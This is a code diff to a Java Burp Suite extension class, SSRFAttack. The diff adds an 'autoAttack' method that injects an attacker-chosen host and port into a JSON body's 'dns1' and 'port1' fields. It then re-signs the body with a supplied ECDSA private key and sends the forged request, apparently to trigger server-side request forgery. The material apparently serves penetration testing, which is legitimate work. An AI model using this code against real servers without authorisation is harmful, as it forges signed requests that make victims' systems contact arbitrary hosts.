@@ -40,6 +40,8 @@ public class SSRFAttack {
 
     private byte[] updateMessage;
 
+    private SignatureFn signatureFn;
+
     public SSRFAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse message){
 
         this.callbacks = callbacks;
@@ -48,6 +50,8 @@ public class SSRFAttack {
         this.requestInfo = helpers.analyzeRequest(message);
         this.stdout = new PrintWriter(callbacks.getStdout(), true);
         this.httpService = message.getHttpService();
+
+        signatureFn = new SignatureFn();
     }
 
     public void hostheaderAttack(String modText, boolean isProxy, String proxyDNS, int proxyPort){
@@ -138,6 +142,55 @@ public class SSRFAttack {
         loggerInstance.log(getClass(), "Executing SSRF Attack in the Background"  , Logger.LogLevel.INFO);
         AttackExecutor attackRequestExecutor = new AttackExecutor(updateMessage);
         attackRequestExecutor.execute();
+    }
+
+    /**
+     * Automatic SSRF attack with input given by the user
+     */
+    public void autoAttack(String bodyTxt, String privKey, String inputVal, String inputPort, boolean proxyVal, String proxyDNS, int proxyPort) {
+        // steps for type 22 get bo tag {}
+        int tempbod =  bodyTxt.indexOf("\"bo\""); // there are two bo
+        int temp =  bodyTxt.indexOf("\"bo\"", tempbod+1);
+        String remainStr = bodyTxt.substring(temp+5);
+        int tempEnd =  remainStr.indexOf("}");
+        String signBody = bodyTxt.substring(temp+5, temp+tempEnd+6);
+        String beforeSign = bodyTxt.substring(0, temp+5);
+        String afterSign = bodyTxt.substring(temp+tempEnd+6);
+
+        // modify sign body if inputVal is given
+        int tempDNS =  signBody.indexOf("\"dns1\"");
+        int temptodh =  signBody.indexOf("\"to0dh\"");
+        String modSignBody = signBody.substring(0,tempDNS+7) + "\"" + inputVal +  "\",\"port1\":" + inputPort +  signBody.substring(temptodh-1, signBody.length());
+        
+        // send request to Signature Tab
+        privKey = privKey.replaceAll("\\n", "").replace("-----BEGIN PRIVATE KEY-----", "").replace("-----END PRIVATE KEY-----", "");
+        String SignValue = signatureFn.computeSignature(modSignBody, privKey, "EC", "SHA256withECDSA");
+        String closingStr = ",\"pk\":[0,0,[0]],\"sg\":[72,\"" + SignValue + "\"]}} ";
+        String reqStr = beforeSign + modSignBody + closingStr;
+        /*
+        loggerInstance.log(getClass(), remainStr  , Logger.LogLevel.INFO);
+        loggerInstance.log(getClass(), signBody  , Logger.LogLevel.INFO);
+        loggerInstance.log(getClass(), beforeSign  , Logger.LogLevel.INFO);
+        */
+        loggerInstance.log(getClass(), SignValue  , Logger.LogLevel.INFO);
+        loggerInstance.log(getClass(), reqStr  , Logger.LogLevel.INFO);
+
+        byte[] updatedReq = this.generateRequest(reqStr, proxyVal, proxyDNS, proxyPort);
+        this.sendAttackReq();
+    }
+
+
+
+    public byte[] generateRequest(String modText, boolean isProxy, String proxyDNS, int proxyPort){
+        //List headers = requestInfo.getHeaders();
+        List<String> headers = requestInfo.getHeaders();
+        String request = new String(requestResponse.getRequest());
+        String messageBody = request.substring(requestInfo.getBodyOffset());
+        if(isProxy){
+            this.httpService = helpers.buildHttpService(proxyDNS,proxyPort,this.httpService.getProtocol());
+        }
+        updateMessage = helpers.buildHttpMessage(headers, modText.getBytes());
+        return updateMessage;
     }
 
 
